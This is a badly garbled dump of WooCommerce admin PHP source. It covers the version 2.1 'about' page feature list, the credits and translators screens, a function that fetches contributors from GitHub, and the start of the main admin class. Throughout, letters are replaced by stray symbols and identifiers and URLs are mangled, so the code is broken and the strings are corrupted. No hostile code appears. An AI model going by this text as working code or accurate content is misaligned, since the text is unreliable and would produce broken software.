><?
php
 
	`_e
( 'Access your data from 3rd…arty‡pplications', 'woocommerce' ); ?></h4>

253 <
p
><?
php
 
	`_e
( 'Built onop ofhe WooCommerce API,‡ndargeted directly‡t developers,he‚ew REST API‡llows youo get data for <strong>Orders</strong>, <strong>Coupons</strong>, <strong>Customers</strong>, <strong>Products</strong>‡nd <strong>Reports</strong> in both <code>XML</code>‡nd <code>JSON</code> formats.', 'woocommerce' ); ?></p>

254 </
div
>

255 <
div
 
şass
="icon"></div>

256 <
div
 
şass
="last-feature">

257 <
h4
><?
php
 
	`_e
( 'Authenticationo keep data secure', 'woocommerce' ); ?></h4>

258 <
p
><?
php
 
	`_e
( 'Authentication forhe REST API is…erformed using HTTP Basic Auth if you have SSLƒnabled, or signed‡ccordingohe <a href="http://tools.ietf.org/html/rfc5849">OAuth 1.0a</a> specification if you don\'t have SSL. Data is only‡vailableo‡uthenticated users.', 'woocommerce' ); ?></p>

259 </
div
>

260 </
div
>

261 </
div
>

262 <
div
 
şass
="changelog">

263 <
h3
><?
php
 
	`_e
( 'UI‡nd„eporting improvements', 'woocommerce' ); ?></h3>

264 <
div
 
şass
="wc-feature feature-section colhree-col">

265 <
div
>

266 <
h4
><?
php
 
	`_e
( 'WordPress 3.8‡dmin UI compatibility', 'woocommerce' ); ?></h4>

267 <
p
><?
php
 
	`_e
( 'WooCommerce 2.1 has had its UI„estyledo work withhe‚ew‡dmin design in WordPress 3.8. All bitmap icons have been„eplaced with‡ custom,†ightweight icon font for„azor sharp clarity on„etina devices‡s well‡s improved…erformance.', 'woocommerce' ); ?></p>

268 </
div
>

269 <
div
>

270 <
h4
><?
php
 
	`_e
( 'Simplified order UI', 'woocommerce' ); ?></h4>

271 <
p
><?
php
 
	`_e
( 'The orders…anel has seen significant improvemento bothheotals…anel,‡nd†ine item display makingƒditing‚ew‡ndƒxisting orders‡ breeze.', 'woocommerce' ); ?></p>

272 <
p
><?
php
 
	`_e
( 'Item meta has‡lso been optimised‡nd can‚ow be viewed‡s HTML„atherhan stuck in‡ext input.', 'woocommerce' ); ?></p>

273 </
div
>

274 <
div
 
şass
="last-feature">

275 <
h4
><?
php
 
	`_e
( 'Improved Reporting', 'woocommerce' ); ?></h4>

276 <
p
><?
php
 
	`_e
( 'Reports have been„edesigned with‚ew <strong>filtering</strong> capabilities,‡‚ew <strong>customer„eport</strong> showing orders/spending,‡ndhe‡bilityo <strong>export CSVs</strong>.', 'woocommerce' ); ?></p>

277 <
p
><?
php
 
	`_e
( 'The dashboard‡lso has‡‚ew widget showing you‡n overview of current orders complete with sparklines for quick‡t-a-glance stats.', 'woocommerce' ); ?></p>

278 </
div
>

279 </
div
>

280 </
div
>

281 <
div
 
şass
="changelog‡bout-integrations">

282 <
h3
><?
php
 
	`_e
( 'Separated integrations', 'woocommerce' ); ?></h3>

283 <
div
 
şass
="wc-feature feature-section colhree-col">

284 <
div
>

285 <
h4
><?
php
 
	`_e
( 'New separate…lugins', 'woocommerce' ); ?></h4>

286 <
p
><?
php
 
	`_e
( 'To make core more†ean, some integrations have been„emoved‡ndurned into dedicated…lugins which you can install‡s‡nd when you‚eedhem.', 'woocommerce' ); ?></p>

287 </
div
>

288 <
div
>

289 <
h4
><?
php
 
	`_e
( 'Google Analytics', 'woocommerce' ); ?></h4>

290 <
p
><?
php
 
	`_e
( 'Add Google AnalyticsƒCommercerackingo your WooCommerce store.', 'woocommerce' ); ?></p>

291 <
p
><
a
 
h»f
="h‰p://wÜd´ess.Üg/¶ugšs/woocomm”û-googË-ª®ytics-š‹g¿tiÚ" 
şass
="bu‰Ú"><?
php
 
	`_e
( 'Download', 'woocommerce' ); ?></a></p>

292 </
div
>

293 <
div
 
şass
="last-feature">

294 <
h4
><?
php
 
	`_e
( 'Piwik', 'woocommerce' ); ?></h4>

295 <
p
><?
php
 
	`_e
( 'Integrate WooCommerce with Piwik‡ndhe WP-Piwik…lugin.', 'woocommerce' ); ?></p>

296 <
p
><
a
 
h»f
="h‰p://wÜd´ess.Üg/¶ugšs/woocomm”û-piwik-š‹g¿tiÚ/" 
şass
="bu‰Ú"><?
php
 
	`_e
( 'Download', 'woocommerce' ); ?></a></p>

297 </
div
>

298 <
div
>

299 <
h4
><?
php
 
	`_e
( 'ShareThis', 'woocommerce' ); ?></h4>

300 <
p
><?
php
 
	`_e
( 'Add social‚etwork sharing buttonso…roducts using ShareThis.', 'woocommerce' ); ?></p>

301 <
p
><
a
 
h»f
="h‰p://wÜd´ess.Üg/¶ugšs/woocomm”û-sh¬‘his-š‹g¿tiÚ/" 
şass
="bu‰Ú"><?
php
 
	`_e
( 'Download', 'woocommerce' ); ?></a></p>

302 </
div
>

303 <
div
>

304 <
h4
><?
php
 
	`_e
( 'Sharedaddy', 'woocommerce' ); ?></h4>

305 <
p
><?
php
 
	`_e
( 'Add social‚etwork sharing buttonso…roducts using Sharedaddy.', 'woocommerce' ); ?></p>

306 <
p
><
a
 
h»f
="h‰p://wÜd´ess.Üg/¶ugšs/woocomm”û-sh¬edaddy-š‹g¿tiÚ/" 
şass
="bu‰Ú"><?
php
 
	`_e
( 'Download', 'woocommerce' ); ?></a></p>

307 </
div
>

308 <
div
 
şass
="last-feature">

309 <
h4
><?
php
 
	`_e
( 'ShareYourCart', 'woocommerce' ); ?></h4>

310 <
p
><?
php
 
	`_e
( 'Let users shareheir carts for‡ discount usinghe ShareYourCart service.', 'woocommerce' ); ?></p>

311 <
p
><
a
 
h»f
="h‰p://wÜd´ess.Üg/¶ugšs/sh¬eyourÿ¹/" 
şass
="bu‰Ú"><?
php
 
	`_e
( 'Download', 'woocommerce' ); ?></a></p>

312 </
div
>

313 </
div
>

314 </
div
>

315 <
div
 
şass
="changelog">

316 <
h3
><?
php
 
	`_e
( 'Underhe Hood', 'woocommerce' ); ?></h3>

318 <
div
 
şass
="feature-section colhree-col">

319 <
div
>

320 <
h4
><?
php
 
	`_e
( 'PayPal PDT support', 'woocommerce' ); ?></h4>

321 <
p
><?
php
 
	`_e
( 'PayPal Data Transfer (PDT) is‡n‡lternative for PayPal IPN which sends backhe status of‡n order when‡ customer„eturns from PayPal.', 'woocommerce' ); ?></p>

322 </
div
>

324 <
div
>

325 <
h4
><?
php
 
	`_e
( 'Stylesheet separation', 'woocommerce' ); ?></h4>

326 <
p
><?
php
 
	`_e
( 'Frontend styles have been split into separate‡ppearance/layout/smallscreen stylesheetso help with selective customisation.', 'woocommerce' ); ?></p>

327 </
div
>

329 <
div
 
şass
="last-feature">

330 <
h4
><?
php
 
	`_e
( 'Newƒndpoints', 'woocommerce' ); ?></h4>

331 <
p
><?
php
 
	`_e
( 'Certain…ages such‡s "Pay", "Order Received"‡nd some‡ccount…ages‡re‚owƒndpoints„atherhan…ageso make checkout more„eliable.', 'woocommerce' ); ?></p>

332 </
div
>

333 </
div
>

334 <
div
 
şass
="feature-section colhree-col">

336 <
div
>

337 <
h4
><?
php
 
	`_e
( 'Default credit card form for gateways', 'woocommerce' ); ?></h4>

338 <
p
><?
php
 
	`_e
( 'We\'ve‡dded‡ standardized, default credit card form for gatewayso use ifhey support <code>default_credit_card_form</code>.', 'woocommerce' ); ?></p>

339 </
div
>

341 <
div
>

342 <
h4
><?
php
 
	`_e
( 'Coupon†imits…er customer', 'woocommerce' ); ?></h4>

343 <
p
><?
php
 
	`_e
( 'Coupon usage†imits can‚ow be set…er user (usingƒmail + ID)„atherhan global.', 'woocommerce' ); ?></p>

344 </
div
>

346 <
div
 
şass
="last-feature">

347 <
h4
><?
php
 
	`_e
( 'Streamlined‚ew-account…rocess', 'woocommerce' ); ?></h4>

348 <
p
><?
php
 
	`_e
( 'During checkout, username‡nd…asswords‡re optional‡nd can be‡utomatically generated by WooCommerce.', 'woocommerce' ); ?></p>

349 </
div
>

351 </
div
>

352 <
div
 
şass
="feature-section colhree-col">

354 <
div
>

355 <
h4
><?
php
 
	`_e
( 'Additional…rice display options', 'woocommerce' ); ?></h4>

356 <
p
><?
php
 
	`_e
( 'Define whether…rices should be shown incl. orƒxcl. ofax onhe frontend,‡nd‡dd‡n optional suffix.', 'woocommerce' ); ?></p>

357 </
div
>

359 <
div
>

360 <
h4
><?
php
 
	`_e
( 'Past order†inking', 'woocommerce' ); ?></h4>

361 <
p
><?
php
 
	`_e
( 'Admins‚ow havehe‡bilityo†ink…ast orderso‡ customer (beforehey„egistered) byƒmail‡ddress.', 'woocommerce' ); ?></p>

362 </
div
>

364 <
div
 
şass
="last-feature">

365 <
h4
><?
php
 
	`_e
( 'Review improvements', 'woocommerce' ); ?></h4>

366 <
p
><?
php
 
	`_e
( 'We\'ve‡dded‡‚ew optiono„estrict„eviewso†ogged in…urchasers,‡nd made„atingsƒditable fromhe backend.', 'woocommerce' ); ?></p>

367 </
div
>

369 </
div
>

370 </
div
>

372 <
div
 
şass
="return-to-dashboard">

373 <
a
 
h»f
="<?ph°echØesc_u¾Ğadmš_u¾Ğadd_qu”y_¬gĞ¬¿yĞ'·ge' => 'wc-£‰šgs' ), 'admš.php' ) ) ); ?>"><?
php
 
	`_e
( 'Goo WooCommerce Settings', 'woocommerce' ); ?></a>

374 </
div
>

375 </
div
>

376 <?
php


377 
	}
}

382 
public
 
funùiÚ
 
	$üed™s_sü“n
() {

384 <
div
 
şass
="wrap‡bout-wrap">

386 <?
php
 
$this
->
	`šŒo
(); ?>

388 <
p
 
şass
="about-desütiÚ"><?
php
 
	`_e
( 'WooCommerce is developed‡nd maintained by‡ worldwideeam of…assionate individuals‡nd backed by‡n‡wesome developer community. Wanto see your‚ame? <a href="https://github.com/woothemes/woocommerce/blob/master/CONTRIBUTING.md">Contributeo WooCommerce</a>.', 'woocommerce' ); ?></p>

390 <?
php
 
echo
 
$this
->
	`cÚŒibutÜs
(); ?>

391 </
div
>

392 <?
php


393 
	}
}

398 
public
 
funùiÚ
 
	$Œª¦©Üs_sü“n
() {

400 <
div
 
şass
="wrap‡bout-wrap">

402 <?
php
 
$this
->
	`šŒo
(); ?>

404 <
p
 
şass
="about-desütiÚ"><?
php
 
	`_e
( 'WooCommerce has been kindlyranslated into several other†anguageshankso ourranslationeam. Wanto see your‚ame? <a href="https://www.transifex.com/projects/p/woocommerce/">Translate WooCommerce</a>.', 'woocommerce' ); ?></p>

406 <
p
 
şass
="wp-üed™s-li¡"><
a
 
h»f
="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/ABSOLUTE_Web">
ABSOLUTE_Web
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/AIRomª">
AIRomª
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Andriy.Gu§k">
Andriy
.
Gu§k
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/A³lsšova">
A³lsšova
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Chaos">
Chaos
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Clo£m¬k‘šg">
Clo£m¬k‘šg
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/CßchBœg™">
CßchBœg™
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/DJIO">
DJIO
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Dimis13">
Dimis13
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Gabr›lG">
Gabr›lG
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/G“¹DD">
G“¹DD
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Griga_M">
Griga_M
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/JKKim">
JKKim
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Jªj¯pvªdijk">
Jªj¯pvªdijk
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/K’ÃthJ">
K’ÃthJ
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Lazybadg”">
Lazybadg”
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Ri¡oNišem‘s">
Ri¡oNišem‘s
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/S”geyBœyukov">
S”geyBœyukov
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/SzLeg¿di">
SzLeg¿di
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/TRFÏvou¿¹">
TRFÏvou¿¹
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Th®™­šheœo">
Th®™­šheœo
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/TomiToivio">
TomiToivio
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/TİOSScz">
TİOSScz
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/W’89">
W’89
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/abdmc">
abdmc
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/adamedÙco">
adamedÙco
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/ahmedbadawy">
ahmedbadawy
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/®¯13212">
®¯13212
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/®ichªi">
®ichªi
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/am™gad">
am™gad
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/ªd»y.lima.¿mos">
ªd»y
.
lima
.
¿mos
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/¬haiva">
¬haiva
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/bobosbodega">
bobosbodega
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/ÿlkut">
ÿlkut
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/cgÏud–">
cgÏud–
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/şaudiosmweb">
şaudiosmweb
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/cÛnjacobs">
cÛnjacobs
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/cÜsÚr">
cÜsÚr
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/ı–ham">
ı–ham
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/culkmª">
culkmª
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/d¬ud¬">
d¬ud¬
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/deck”web">
deck”web
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/dek¬u">
dek¬u
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/d’¬efyev">
d’¬efyev
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/e01">
e01
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/e¥–lÿ¡e">
e¥–lÿ¡e
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/fdaciuk">
fdaciuk
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/æyšgoff">
æyšgoff
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/â®escio">
â®escio
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/fxb’¬d">
fxb’¬d
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/gšg”mig">
gšg”mig
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/gİ»ss.co.">
gİ»ss
.
co
.

</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/g»guly">
g»guly
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/h’ryk.ibemešh¬dt">
h’ryk
.
ibemešh¬dt
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Ÿgom–ªŸs">
Ÿgom–ªŸs
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/ideodÜa">
ideodÜa
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/šû±ive">
šû±ive
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/špsyde">
špsyde
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/i¤«l.ûäš">
i¤«l
.
ûäš
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/jamesko¡”">
jamesko¡”
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/j—nmich–l">
j—nmich–l
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/jluisäe™as">
jluisäe™as
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/jÛlb®">
jÛlb®
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/jÛ§Éy">
jÛ§Éy
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/josh_m¬om">
josh_m¬om
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/jpB’fiÿ">
jpB’fiÿ
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/jujj”">
jujj”
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/k¬i¡uck">
k¬i¡uck
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/k¿udio">
k¿udio
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/Ïd.ruz">
Ïd
.
ruz
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/lub®“">
lub®“
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/m¯yehkh®ed">
m¯yehkh®ed
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/m¬cosof">
m¬cosof
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/m¬tŸn36">
m¬tŸn36
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/m¬tš´ojeù">
m¬tš´ojeù
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/m©h_beck">
m©h_beck
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/m©tyza">
m©tyza
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/me2you">
me2you
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/mikejŞËy">
mikejŞËy
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/mj•sÚ">
mj•sÚ
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/mob¬ak">
mob¬ak
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/mom0916">
mom0916
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/mÜtiçùÜ">
mÜtiçùÜ
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/ns™bÚ">
ns™bÚ
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/³rd”sÚged®">
³rd”sÚged®
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/pÙg›‹rg">
pÙg›‹rg
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/¿bas.m¬ek">
¿bas
.
m¬ek
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/¿ç–funch®">
¿ç–funch®
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/¿gulka">
¿gulka
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/¿moÚus">
¿moÚus
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/rcov¬ru">
rcov¬ru
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/»ÇtoäÙa">
»ÇtoäÙa
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/rich¬dshaylÜ">
rich¬dshaylÜ
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/rick£¼©">
rick£¼©
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/rodrigİriÜ">
rodrigİriÜ
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/scÙtbasg¯rd">
scÙtbasg¯rd
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/£Âbršk">
£Âbršk
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/¡goos">
¡goos
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/¡uk88">
¡uk88
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/sumodœjo">
sumodœjo
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/sylv›_jªs£ns">
sylv›_jªs£ns
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/tšasw–t">
tšasw–t
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/toszcze">
toszcze
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/tshowhey">
tshowhey
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/tszmšg">
tszmšg
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/tue.hŞm">
tue
.
hŞm
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/uwÜx">
uwÜx
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/vªbo">
vªbo
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/vŸm¬k‘">
vŸm¬k‘
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/wasim">
wasim
</a>, <¨h»f="h‰ps://www.Œªsiãx.com/accouÁs/´ofe/zodŸc1978">
zodŸc1978
</a></p>

407 </
div
>

408 <?
php


409 
	}
}

417 
public
 
funùiÚ
 
	$cÚŒibutÜs
() {

418 
$cÚŒibutÜs
 = 
$this
->
	`g‘_cÚŒibutÜs
();

420 iàĞ
	`em±y
Ğ
$cÚŒibutÜs
 ) )

423 
$cÚŒibutÜ_li¡
 = '<ul class="wp-people-group">';

425 
	`fÜ—ch
 ( 
$cÚŒibutÜs
 
as
 
$cÚŒibutÜ
 ) {

426 
$cÚŒibutÜ_li¡
 .= '<li class="wp-person">';

427 
$cÚŒibutÜ_li¡
 .ğ
	`¥rštf
( '<a href="%s"itle="%s">',

428 
	`esc_u¾
Ğ'h‰ps://g™hub.com/' . 
$cÚŒibutÜ
->
logš
 ),

429 
	`esc_html
Ğ
	`¥rštf
Ğ
	`__
Ğ'V›w %s', 'woocomm”û' ), 
$cÚŒibutÜ
->
logš
 ) )

431 
$cÚŒibutÜ_li¡
 .ğ
	`¥rštf
Ğ'<img src="%s" width="64" height="64" cÏss="g¿v©¬"‡É="%s" />', 
	`esc_u¾
Ğ
$cÚŒibutÜ
->
av©¬_u¾
 ), 
	`esc_html
Ğ$cÚŒibutÜ->
logš
 ) );

432 
$cÚŒibutÜ_li¡
 .= '</a>';

433 
$cÚŒibutÜ_li¡
 .ğ
	`¥rštf
Ğ'<¨şass="web" h»f="%s">%s</a>', 
	`esc_u¾
Ğ'h‰ps://g™hub.com/' . 
$cÚŒibutÜ
->
logš
 ), 
	`esc_html
( $contributor->login ) );

434 
$cÚŒibutÜ_li¡
 .= '</a>';

435 
$cÚŒibutÜ_li¡
 .= '</li>';

438 
$cÚŒibutÜ_li¡
 .= '</ul>';

440  
$cÚŒibutÜ_li¡
;

441 
	}
}

449 
public
 
funùiÚ
 
	$g‘_cÚŒibutÜs
() {

450 
$cÚŒibutÜs
 = 
	`g‘_Œªs›Á
( 'woocommerce_contributors' );

452 iàĞ
çl£
 !=ğ
$cÚŒibutÜs
 )

453  
$cÚŒibutÜs
;

455 
$»¥Ú£
 = 
	`wp_»mÙe_g‘
Ğ'h‰ps://­i.g™hub.com/»pos/woÙhemes/woocomm”û/cÚŒibutÜs', 
	`¬¿y
Ğ's¦v”ify' => 
çl£
 ) );

457 iàĞ
	`is_wp_”rÜ
Ğ
$»¥Ú£
 ) || 200 !ğ
	`wp_»mÙe_»Œ›ve_»¥Ú£_code
( $response ) )

458  
	`¬¿y
();

460 
$cÚŒibutÜs
 = 
	`jsÚ_decode
Ğ
	`wp_»mÙe_»Œ›ve_body
Ğ
$»¥Ú£
 ) );

462 iàĞ! 
	`is_¬¿y
Ğ
$cÚŒibutÜs
 ) )

463  
	`¬¿y
();

465 
	`£t_Œªs›Á
Ğ'woocomm”û_cÚŒibutÜs', 
$cÚŒibutÜs
, 3600 );

467  
$cÚŒibutÜs
;

468 
	}
}

473 
public
 
funùiÚ
 
	$w–come
() {

476 iàĞ! 
	`g‘_Œªs›Á
( '_wc_activation_redirect' ) )

480 
	`d–‘e_Œªs›Á
( '_wc_activation_redirect' );

483 iàĞ
	`g‘_İtiÚ
( '_wc_needs_update' ) == 1 || get_option( '_wc_needs_pages' ) == 1 )

487 iàĞ
	`is_ÃtwÜk_admš
(è|| 
	`is£t
Ğ
$_GET
['aùiv©e-muÉi'] ) || 
	`defšed
( 'IFRAME_REQUEST' ) )

490 iàĞĞ
	`is£t
Ğ
$_GET
['aùiÚ'] ) && 'upg¿de-¶ugš' =ğ$_GET['aùiÚ'] ) && ( is£tĞ$_GET['¶ugš'] ) && 
	`¡r¡r
( $_GET['plugin'], 'woocommerce.php' ) ) )

493 
	`wp_»dœeù
Ğ
	`admš_u¾
( 'index.php?page=wc-about' ) );

494 
ex™
;

495 
	}
}

498 
Ãw
 
WC_Admš_W–come
();

	@includes/admin/class-wc-admin.php

1 <?
php


2 iàĞ! 
defšed
( 'ABSPATH' ) ) {

3 
	gex™
;

15 şas 
	cWC_Admš
 {

20 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

21 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'includes' ) );

22 
	`add_aùiÚ
Ğ'cu¼’t_sü“n', 
	`¬¿y
Ğ
$this
, 'conditonal_includes' ) );

23 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'prevent_admin_access' ) );

24 
	`add_aùiÚ
Ğ'wp_ajax_·ge_¦u½', 
	`¬¿y
( 'WC_Gateway_Mijireh', 'page_slurp' ) );

25 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'preview_emails' ) );

26 
	`add_aùiÚ
( 'admin_footer', 'wc_print_js', 25 );

32 
public
 
funùiÚ
 
	$šşudes
() {

34 
	`šşude_Úû
( 'wc-admin-functions.php' );

35 
	`šşude_Úû
( 'wc-meta-box-functions.php' );

38 
	`šşude_Úû
( 'class-wc-admin-post-types.php' );

39 
	`šşude_Úû
( 'class-wc-admin-taxonomies.php' );

42 iàĞ! 
	`is_ajax
() ) {

43 
	`šşude
( 'class-wc-admin-menus.php' );

44 
	`šşude
( 'class-wc-admin-welcome.php' );

45 
	`šşude
( 'class-wc-admin-notices.php' );

46 
	`šşude
( 'class-wc-admin-assets.php' );

47 
	`šşude
( 'class-wc-admin-permalink-settings.php' );

48 
	`šşude
( 'class-wc-admin-editor.php' );

51 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_’abË_admš_h–p_b', 
Œue
 ) )

52 
	`šşude
( 'class-wc-admin-help.php' );

56 iàĞ
	`defšed
( 'WP_LOAD_IMPORTERS' ) )

57 
	`šşude
( 'class-wc-admin-importers.php' );

58 
	}
}

63 
public
 
funùiÚ
 
	$cÚd™Ú®_šşudes
() {

64 
$sü“n
 = 
	`g‘_cu¼’t_sü“n
();

66  
$sü“n
->
id
 ) {

68 
	`šşude
( 'class-wc-admin-dashboard.php' );

74 
	`šşude
( 'class-wc-admin-profile.php' );

77 
	}
}

82 
public
 
funùiÚ
 
	$´ev’t_admš_acûss
() {

83 
$´ev’t_acûss
 = 
çl£
;

85 iàĞ'yes' =ğ
	`g‘_İtiÚ
Ğ'woocomm”û_lock_down_admš' ) && ! 
	`is_ajax
(è&& ! ( 
	`cu¼’t_u£r_ÿn
Ğ'ed™_po¡s' ) || cu¼’t_u£r_ÿnĞ'mªage_woocomm”û' ) ) && 
	`ba£Çme
Ğ
$_SERVER
["SCRIPT_FILENAME"] ) !== 'admin-post.php' ) {

86 
$´ev’t_acûss
 = 
Œue
;

89 
$´ev’t_acûss
 = 
	`­¶y_f‹rs
( 'woocommerce_prevent_admin_access', $prevent_access );

91 iàĞ
$´ev’t_acûss
 ) {

92 
	`wp_§ã_»dœeù
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) );

93 
ex™
;

95 
	}
}

101 
public
 
funùiÚ
 
	$´ev›w_emas
